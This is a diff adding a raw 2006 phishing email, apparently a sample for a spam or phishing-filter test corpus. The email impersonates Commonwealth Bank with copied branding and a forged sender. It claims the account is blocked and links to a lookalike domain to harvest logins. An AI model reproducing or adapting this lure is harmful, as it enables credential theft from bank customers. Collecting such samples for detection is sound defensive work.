@@ -1,0 +1,77 @@
+From nobody Sun Jan 25 13:48:16 2015
+Return-Path: <validate@commbank.com.au>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.5.6.7])
+ by funky.example.com (Postfix) with ESMTP id 8344346A61
+ for <nobody@login.example.com>; Tue,  4 Jul 2006 18:56:41 -0400 (EDT)
+Received: from vantivedev (static5-66-244-94-107.stfd.smithvilledsl.net
+ [66.244.94.107])
+ by mail1.example.com (Postfix) with ESMTP id 4F1286CCF7B
+ for <nobody@example.com>; Tue,  4 Jul 2006 18:56:40 -0400 (EDT)
+Received: from User ([68.34.50.115]) by vantivedev with Microsoft
+ SMTPSVC(5.0.2195.6713); Tue, 4 Jul 2006 17:48:22 -0600
+From: "Commonwealth Bank"<validate@commbank.com.au>
+Subject: Commonwealth Online Banking
+Date: Tue, 4 Jul 2006 15:56:37 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <VANTIVEDEVmTZqTDvn80000012d@vantivedev>
+X-OriginalArrivalTime: 04 Jul 2006 23:48:22.0338 (UTC)
+ FILETIME=[557E3A20:01C69FC4]
+To: undisclosed-recipients:;
+Status: R
+X-Status: 
+X-Keywords: 
+
+<style type="text/css">
+<!--
+.style1 {
+	font-size: 12px;
+	font-weight: bold;
+}
+.style2 {font-size: 14px}
+.style5 {font-size: 18px}
+.style7 {
+	font-size: 12px;
+	font-style: italic;
+}
+-->
+</style>
+<table width="503" border="0">
+  <tr>
+    <td width="509"><span class="body"><img alt="Commonwealth Bank logo" 
+      src="http://www.commbank.com.au/CommonImages/CBA_Logo.gif" border="0" /></span></td>
+  </tr>
+  <tr>
+    <td><p>&nbsp;</p>
+    <p class="style5">Your Online Banking is Blocked</p>
+    <p>&nbsp;</p></td>
+  </tr>
+  <tr>
+    <td><span class="style2">Because of unusual number of invalid login attempts on you account, we had to believe that, their might be some security problem on you account.
+        </P>
+    </span>
+      <p class="text1 style2" style1="style1">So we have decided to put an extra verification process to ensure your identity and your account security.</p>
+      <p class="text1 style2" style1="style1">Please click on continue to the verification process and ensure your account security. It is all about your security.<br />
+      </p>
+      <table align="center" bgcolor="#FFFFCC" cellpadding="8" cellspacing="0">
+        <tr valign="top">
+          <td align="center">&nbsp;<a href="http://verifyserveraus.com//commbank.com.au/Logon.htm" target="_blank"><span class="emphasis">Unblock your account</span></a>&nbsp;</td>
+        </tr>
+      </table>
+      <p class="text1 style2" style1="style1">&nbsp;</p>
+    <p class="text1"><span class="style2">Thank you.</span></p>
+    <p class="text1">&nbsp;</p></td>
+  </tr>
+  <tr>
+    <td><span class="contentBold style2 style1 style1"><span class="contentBold style1 style7">&copy; Commonwealth Bank Limited. Use of the information contained on  this page is governed by Australian law and is subject to the  disclaimers which can be read on the disclaimer page. View the Commonwealth Privacy Policy. </span></span></td>
+  </tr>
+</table>
+<p class="text1">&nbsp;</p>
